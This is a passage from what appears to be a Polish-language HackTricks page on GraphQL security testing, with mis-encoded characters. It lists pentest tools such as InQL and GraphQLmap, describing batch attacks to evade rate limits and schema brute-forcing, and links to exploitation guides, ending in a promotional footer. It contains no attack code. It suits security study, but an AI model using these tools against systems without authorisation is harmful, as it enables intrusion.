* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): NarzÄ™dzie, ktÃ³re moÅ¼na uÅ¼ywaÄ‡ do pobierania schematÃ³w i wyszukiwania wraÅ¼liwych danych, testowania autoryzacji, prÃ³b siÅ‚owych schematÃ³w i znajdowania Å›cieÅ¼ek do okreÅ›lonego typu.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): MoÅ¼e byÄ‡ uÅ¼ywane jako samodzielne narzÄ™dzie lub [rozszerzenie Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): MoÅ¼e byÄ‡ uÅ¼ywane jako klient CLI do automatyzacji atakÃ³w.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): NarzÄ™dzie, ktÃ³re wyÅ›wietla rÃ³Å¼ne sposoby dotarcia do okreÅ›lonego typu w schemacie GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Rozszerzenie Burp do zaawansowanego testowania GraphQL. Komponent _**Scanner**_ jest rdzeniem InQL v5.0, gdzie moÅ¼na analizowaÄ‡ punkt koÅ„cowy GraphQL lub lokalny plik schematu introspekcyjnego. Automatycznie generuje wszystkie moÅ¼liwe zapytania i mutacje, organizujÄ…c je w strukturalny widok do analizy. Komponent _**Attacker**_ pozwala uruchamiaÄ‡ wsadowe ataki GraphQL, co moÅ¼e byÄ‡ przydatne do omijania sÅ‚abo zaimplementowanych limitÃ³w szybkoÅ›ci.

### Klienci

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Klient GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Klient GUI

### Automatyczne testy

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Wideo wyjaÅ›niajÄ…ce AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## OdwoÅ‚ania

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
